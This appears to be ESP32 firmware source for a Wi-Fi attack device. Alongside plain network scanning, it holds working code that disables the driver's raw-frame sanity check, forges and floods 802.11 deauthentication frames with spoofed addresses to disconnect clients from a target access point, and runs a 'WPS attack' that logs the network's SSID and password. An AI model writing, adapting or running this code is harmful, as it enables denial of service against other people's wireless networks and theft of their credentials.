#include "wifi_driver.h"

// Hack
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    if (arg == 31337)
        return 1;
    else
        return 0;
}

// Inits
wifi_config_t ap_config;
esp_wps_config_t config;
wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
static bool wlan_status = false;
static bool wlan_attack_status = false;
static int timeout = 0; // milis
static bool rate = false;
static int deauth_delay = 50;
static int deauth_count = 100;
static std::vector<String> wps_data;

// Deauth
uint8_t deauth_frame_default[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00};

namespace Drivers
{

    void Wifi::init()
    {
        if (WiFi.mode(WIFI_STA))
        {
            set_tx_power(WIFI_POWER_19_5dBm);
            wlan_status = true;
        }
        else
            wlan_status = false;
    }

    void Wifi::deinit()
    {
        WiFi.mode(WIFI_MODE_NULL);
        wlan_status = false;
    }

    std::vector<String> Wifi::scan_aps(std::vector<String> vec)
    {
        vec.clear(); // clear old datas
        if (!wlan_status)
            init();
        else
            WiFi.scanDelete();

        String wifiData;
        int n = WiFi.scanNetworks(false, true);

        if (n == 0)
        {
            vec.clear();
            vec.push_back("no networks found");
        }
        else
        {
            for (int i = 0; i < n; ++i)
            {
                wifiData = "";
                // Print SSID and RSSI for each network found
                wifiData += WiFi.SSID(i);
                wifiData += "|";
                wifiData += WiFi.RSSI(i);
                wifiData += "|";
                wifiData += String(WiFi.channel(i));
                wifiData += "|";
                switch (WiFi.encryptionType(i))
                {
                case WIFI_AUTH_OPEN:
                    wifiData += "open";
                    break;
                case WIFI_AUTH_WEP:
                    wifiData += "WEP";
                    break;
                case WIFI_AUTH_WPA_PSK:
                    wifiData += "WPA";
                    break;
                case WIFI_AUTH_WPA2_PSK:
                    wifiData += "WPA2";
                    break;
                case WIFI_AUTH_WPA_WPA2_PSK:
                    wifiData += "WPA+WPA2";
                    break;
                case WIFI_AUTH_WPA2_ENTERPRISE:
                    wifiData += "WPA2-EAP";
                    break;
                case WIFI_AUTH_WPA3_PSK:
                    wifiData += "WPA3";
                    break;
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    wifiData += "WPA2+WPA3";
                    break;
                case WIFI_AUTH_WAPI_PSK:
                    wifiData += "WAPI";
                    break;
                default:
                    wifiData += "unknown";
                }
                // wifiData += ",0n";
                wifiData += "|";
                wifiData += WiFi.BSSIDstr(i);
                wifiData += "|";
                wifiData += WiFi.WPS(i);
                if (std::find(vec.begin(), vec.end(), wifiData) == vec.end())
                {
                    vec.push_back(wifiData);
                }
            }
        }

        // Delete the scan result to free memory for code below.
        return vec;
    }

    std::vector<String> Wifi::scan_aps_async(std::vector<String> vec)
    {
        vec.clear(); // clear old datas
        if (!wlan_status)
            init();
        else
            WiFi.scanDelete();

        String wifiData;

        WiFi.scanNetworks(true, true);

        int n = WiFi.scanComplete();

        if (n == 0)
        {
            vec.clear();
            vec.push_back("no networks found");
        }
        else
        {
            for (int i = 0; i < n; ++i)
            {
                wifiData = "";
                // Print SSID and RSSI for each network found
                wifiData += WiFi.SSID(i);
                wifiData += "|";
                wifiData += WiFi.RSSI(i);
                wifiData += "dbm|";
                wifiData += String(WiFi.channel(i));
                wifiData += "|";
                switch (WiFi.encryptionType(i))
                {
                case WIFI_AUTH_OPEN:
                    wifiData += "open";
                    break;
                case WIFI_AUTH_WEP:
                    wifiData += "WEP";
                    break;
                case WIFI_AUTH_WPA_PSK:
                    wifiData += "WPA";
                    break;
                case WIFI_AUTH_WPA2_PSK:
                    wifiData += "WPA2";
                    break;
                case WIFI_AUTH_WPA_WPA2_PSK:
                    wifiData += "WPA+WPA2";
                    break;
                case WIFI_AUTH_WPA2_ENTERPRISE:
                    wifiData += "WPA2-EAP";
                    break;
                case WIFI_AUTH_WPA3_PSK:
                    wifiData += "WPA3";
                    break;
                case WIFI_AUTH_WPA2_WPA3_PSK:
                    wifiData += "WPA2+WPA3";
                    break;
                case WIFI_AUTH_WAPI_PSK:
                    wifiData += "WAPI";
                    break;
                default:
                    wifiData += "unknown";
                }
                // wifiData += ",0n";
                wifiData += "|";
                wifiData += WiFi.BSSIDstr(i);
                wifiData += "|";
                wifiData += WiFi.WPS(i);
                if (std::find(vec.begin(), vec.end(), wifiData) == vec.end())
                {
                    vec.push_back(wifiData);
                }
            }
        }

        // Delete the scan result to free memory for code below.
        return vec;
    }

    void Wifi::set_tx_power(wifi_power_t power)
    {
        WiFi.setTxPower(power);
    }

    void Wifi::set_rate(bool status)
    {
        rate = status;
    }

    bool Wifi::get_rate()
    {
        return rate;
    }

    void Wifi::wps_config()
    {
        config.wps_type = ESP_WPS_MODE;
        strcpy(config.factory_info.manufacturer, ESP_MANUFACTURER);
        strcpy(config.factory_info.model_number, ESP_MODEL_NUMBER);
        strcpy(config.factory_info.model_name, ESP_MODEL_NAME);
        strcpy(config.factory_info.device_name, ESP_DEVICE_NAME);
    }

    void Wifi::wps_start()
    {
        if (esp_wifi_wps_enable(&config))
        {
            wps_data.push_back("WPS Enable Failed");
        }
        else if (esp_wifi_wps_start(0))
        {
            wps_data.push_back("WPS Start Failed");
        }
    }

    void Wifi::wps_stop()
    {
        if (esp_wifi_wps_disable())
        {
            wps_data.push_back("WPS Disable Failed");
        }
    }

    String wpspin2string(uint8_t a[])
    {
        char wps_pin[9];
        for (int i = 0; i < 8; i++)
        {
            wps_pin[i] = a[i];
        }
        wps_pin[8] = '\0';
        return (String)wps_pin;
    }

    void Wifi::wps_event(WiFiEvent_t event, arduino_event_info_t info)
    {
        switch (event)
        {
        case ARDUINO_EVENT_WIFI_STA_START:
            wps_data.push_back("WPS Attack: Started");
            break;
        case ARDUINO_EVENT_WIFI_STA_GOT_IP:
            wps_data.push_back("SSID: " + WiFi.SSID());
            wps_data.push_back("PASS: " + WiFi.psk());
            break;
        case ARDUINO_EVENT_WIFI_STA_DISCONNECTED:
            wps_data.push_back("WPS Attack: Disconn.");
            WiFi.reconnect();
            break;
        case ARDUINO_EVENT_WPS_ER_SUCCESS:
            wps_stop();
            delay(10);
            WiFi.begin();
            wps_data.push_back("WPS Attack: Success");
            break;
        case ARDUINO_EVENT_WPS_ER_FAILED:
            wps_stop();
            delay(10);
            wps_start();
            wps_data.push_back("WPS Attack: Failed");
            break;
        case ARDUINO_EVENT_WPS_ER_TIMEOUT:
            wps_stop();
            delay(10);
            wps_start();
            wps_data.push_back("WPS Attack: Timedout");
            break;
        case ARDUINO_EVENT_WPS_ER_PIN:
            wps_data.push_back("WPS_PIN: " + wpspin2string(info.wps_er_pin.pin_code));
            break;
        default:
            break;
        }
    }

}

namespace Attack
{
    void Wifi::init()
    {
        Serial.println("init");
        wlan_attack_status = true;
        ap_config.ap.ssid_hidden = 1;
        ap_config.ap.beacon_interval = 10000;
        ap_config.ap.ssid_len = 0;

        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
        esp_wifi_start();

        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

        esp_wifi_set_promiscuous(true);
        esp_wifi_set_max_tx_power(82);
    }

    void Wifi::start_deauth(String mac_str, uint8_t channel)
    {
        //  куда = кто логика глушения перепутана местами куда в ff:ff... кто мак цели
        String dst_mac = "ff:ff:ff:ff:ff:ff";
        byte src_mac[6];
        // byte src_mac[6] = {0x3E, 0x52, 0xA1, 0x1E, 0x09, 0xA1};
        for (int i = 0; i < 6; i++)
        {
            src_mac[i] = strtoul(mac_str.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
        }

        if (!wlan_attack_status)
            init();

        send_deauth_frame(src_mac, channel, dst_mac);
        delay(deauth_delay);
        //  Serial.println(ieee80211_raw_frame_sanity_check(31337, 0, 0));
    }

    void Wifi::stop_deauth()
    {
        WiFi.mode(WIFI_MODE_NULL);
        wlan_attack_status = false;
    }

    void Wifi::send_deauth_frame(uint8_t bssid[6], int channel, String dst_mac_str)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        delay(1);

        // Build packet
        sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
               &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);

        deauth_frame_default[10] = bssid[0];
        deauth_frame_default[11] = bssid[1];
        deauth_frame_default[12] = bssid[2];
        deauth_frame_default[13] = bssid[3];
        deauth_frame_default[14] = bssid[4];
        deauth_frame_default[15] = bssid[5];

        deauth_frame_default[16] = bssid[0];
        deauth_frame_default[17] = bssid[1];
        deauth_frame_default[18] = bssid[2];
        deauth_frame_default[19] = bssid[3];
        deauth_frame_default[20] = bssid[4];
        deauth_frame_default[21] = bssid[5];

        // Send packet
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
    }

    void Wifi::send_deauth_frame(uint8_t bssid[6], int channel, uint8_t mac[6])
    {
        //   set_channel = channel;
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        delay(1);

        // Build AP source packet
        deauth_frame_default[4] = mac[0];
        deauth_frame_default[5] = mac[1];
        deauth_frame_default[6] = mac[2];
        deauth_frame_default[7] = mac[3];
        deauth_frame_default[8] = mac[4];
        deauth_frame_default[9] = mac[5];

        deauth_frame_default[10] = bssid[0];
        deauth_frame_default[11] = bssid[1];
        deauth_frame_default[12] = bssid[2];
        deauth_frame_default[13] = bssid[3];
        deauth_frame_default[14] = bssid[4];
        deauth_frame_default[15] = bssid[5];

        deauth_frame_default[16] = bssid[0];
        deauth_frame_default[17] = bssid[1];
        deauth_frame_default[18] = bssid[2];
        deauth_frame_default[19] = bssid[3];
        deauth_frame_default[20] = bssid[4];
        deauth_frame_default[21] = bssid[5];

        // Send packet
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

        // Build AP dest packet
        deauth_frame_default[4] = bssid[0];
        deauth_frame_default[5] = bssid[1];
        deauth_frame_default[6] = bssid[2];
        deauth_frame_default[7] = bssid[3];
        deauth_frame_default[8] = bssid[4];
        deauth_frame_default[9] = bssid[5];

        deauth_frame_default[10] = mac[0];
        deauth_frame_default[11] = mac[1];
        deauth_frame_default[12] = mac[2];
        deauth_frame_default[13] = mac[3];
        deauth_frame_default[14] = mac[4];
        deauth_frame_default[15] = mac[5];

        deauth_frame_default[16] = mac[0];
        deauth_frame_default[17] = mac[1];
        deauth_frame_default[18] = mac[2];
        deauth_frame_default[19] = mac[3];
        deauth_frame_default[20] = mac[4];
        deauth_frame_default[21] = mac[5];

        // Send packet
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
    }

    void Wifi::set_deauth_count(int count)
    {
        Serial.println(count);
        deauth_count = count;
    }

    void Wifi::set_deauth_delay(int timeout)
    {
        Serial.println(timeout);
        deauth_delay = timeout;
    }

    int Wifi::get_deauth_count()
    {
        return deauth_count;
    }

    int Wifi::get_deauth_delay()
    {
        return deauth_delay;
    }

    void Wifi::wps_listner()
    {
        wps_data.clear();
        delay(10);
        WiFi.onEvent(Drivers::Wifi::wps_event); // Will call WiFiEvent() from another thread.
        WiFi.mode(WIFI_MODE_STA);
        wps_data.push_back("Starting...");
        Drivers::Wifi::wps_config();
        Drivers::Wifi::wps_start();
    }

    std::vector<String> Wifi::wps_updates()
    {
        return wps_data;
    }

    void Wifi::wps_attack_stop()
    {
        wps_data.clear();
        Drivers::Wifi::wps_stop();
        WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {});
        WiFi.mode(WIFI_OFF);
    }

}